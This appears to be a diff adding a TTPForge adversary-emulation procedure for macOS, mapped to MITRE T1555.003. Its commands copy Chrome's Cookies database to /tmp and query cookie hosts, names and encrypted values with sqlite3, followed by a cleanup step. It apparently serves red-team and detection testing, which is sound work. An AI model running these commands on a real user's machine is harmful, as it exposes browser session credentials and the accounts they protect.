@@ -1,0 +1,49 @@
+api_version: 2.0
+uuid: 12345678-1234-1234-1234-000000000008
+name: Chrome Cookie Extraction
+description: Extract cookies from Google Chrome browser
+author: TTPForge
+created: 2025-01-30
+tactics:
+  - Credential Access
+techniques:
+  - T1555.003
+requirements:
+  platforms:
+    - os: darwin
+args:
+  - name: output_file
+    description: File to store extracted cookies
+    default: "/tmp/chrome_cookies.txt"
+  - name: chrome_user
+    description: Chrome user profile to target
+    default: "Default"
+steps:
+  - name: Check Chrome Profile
+    type: command
+    command: "test -d ~/Library/Application\\ Support/Google/Chrome/{{ chrome_user }} && echo 'Chrome profile found'"
+    
+  - name: Copy Chrome Database
+    type: command
+    command: "cp ~/Library/Application\\ Support/Google/Chrome/{{ chrome_user }}/Cookies /tmp/Cookies_copy 2>/dev/null || true"
+    
+  - name: Query Chrome Cookies
+    type: command
+    command: "sqlite3 /tmp/Cookies_copy 'SELECT host_key, name, encrypted_value FROM cookies LIMIT 10;' 2>/dev/null | head -20"
+
+checks:
+  - type: file_exists
+    value: "/tmp/Cookies_copy"
+    description: Verify Chrome Cookies database was copied
+
+tests:
+  - name: Check Chrome Installation
+    description: Verify Chrome browser exists
+    test_type: default
+    steps:
+      - "test -d ~/Library/Application\\ Support/Google/Chrome && echo 'Chrome found'"
+
+cleanup:
+  - type: command
+    command: "rm -f /tmp/Cookies_copy {{ output_file }}"
+    description: Remove copied Chrome database and output
